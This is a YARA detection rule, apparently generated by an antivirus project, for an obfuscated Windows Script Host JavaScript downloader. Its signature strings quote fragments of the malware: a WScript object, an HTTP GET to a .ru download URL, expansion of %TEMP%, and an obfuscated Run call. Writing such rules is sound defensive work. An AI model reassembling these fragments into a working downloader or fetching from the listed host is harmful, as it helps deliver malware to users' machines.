rule sig_20160428_749b5a7af77f1d891b9900faa7c13d4a {
  meta:
    description = "datamaliciousorder - file 20160428_749b5a7af77f1d891b9900faa7c13d4a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a6a40b6d9c450773d443ed7ee638c21c06e96d56bf5ddbe95260c01a89b20147"

  strings:
    $s1  = "KueQdkMmvMzaUqpGykDzu[HuaLezQekYelQjjQupFtp](\"G\" + \"ET\", \"http://minisupergame.ru/a9osfg\", false);" fullword ascii
    $s2  = "function KvyWorPqoThhDlfJrwLdp(EwiDxuGkoOdrUmjWnuPuu){AafYglUtfFsuBsuRadSqs[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function KvyWorPqoThhDlfJrwLdp(EwiDxuGkoOdrUmjWnuPuu){AafYglUtfFsuBsuRadSqs[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function BtaNxePdyYhjDpbQcxLbt() {return AafYglUtfFsuBsuRadSqs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "return SjsVevSssUafDovGnxCkp - WdaJkvMuzBdtGmtWbgFdb;};" fullword ascii
    $s6  = "var AafYglUtfFsuBsuRadSqs = function GuvAplJavJvmDvnPcbLqv() {return JyeKzvOszBofGtlIbiLtm[VzqHofFgeLciUcxHxxBfu](\"WScript\"+\"" ascii
    $s7  = "var AafYglUtfFsuBsuRadSqs = function GuvAplJavJvmDvnPcbLqv() {return JyeKzvOszBofGtlIbiLtm[VzqHofFgeLciUcxHxxBfu](\"WScript\"+\"" ascii
    $s8  = "var JyeKzvOszBofGtlIbiLtm = this[\"WScript\"];" fullword ascii
    $s9  = "function BtaNxePdyYhjDpbQcxLbt() {return AafYglUtfFsuBsuRadSqs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function BwvPfrFyzJblGnfOnoAkn(){return TcnJtmMuuIpkHmbTjaOmh + \"\";};" fullword ascii
    $s11 = "if (KueQdkMmvMzaUqpGykDzu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function FilWeeEgiLubOdqDwcArk(SjsVevSssUafDovGnxCkp, WdaJkvMuzBdtGmtWbgFdb){EeiNzlJfmAepZwvNotRlg = EeiNzlJfmAepZwvNotRlg * 1; " ascii
    $s13 = "function XcjUgjMncGpkAfxSwlHtl() {return ((KgeRosNboBlaGivXjhRpy == true) && (KgeRosNboBlaGivXjhRpy == RyyRhuLdpWceOicVnlSvz)) ?" ascii
    $s14 = "function XcjUgjMncGpkAfxSwlHtl() {return ((KgeRosNboBlaGivXjhRpy == true) && (KgeRosNboBlaGivXjhRpy == RyyRhuLdpWceOicVnlSvz)) ?" ascii
    $s15 = "function IutNnsBwcWzpPknDocFyu(NdrIfrEziJvuTqdHvuLqx) {var PcdXruGyfVkpJsmIilAsc = (1, 2, 3, 4, 5, NdrIfrEziJvuTqdHvuLqx); retur" ascii
    $s16 = "FjuQpoWgkIdoQzhDgyPyj = true;" fullword ascii
    $s17 = "function HhiBskXpzPpqRhtOwiGoc(){return 23;};" fullword ascii
    $s18 = "function OlmPimGbzYusHugGylXtq(){return VzqHofFgeLciUcxHxxBfu;};" fullword ascii
    $s19 = "function IutNnsBwcWzpPknDocFyu(NdrIfrEziJvuTqdHvuLqx) {var PcdXruGyfVkpJsmIilAsc = (1, 2, 3, 4, 5, NdrIfrEziJvuTqdHvuLqx); retur" ascii
    $s20 = "}while (IarJktUmcXyqOsgFoqJvs);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}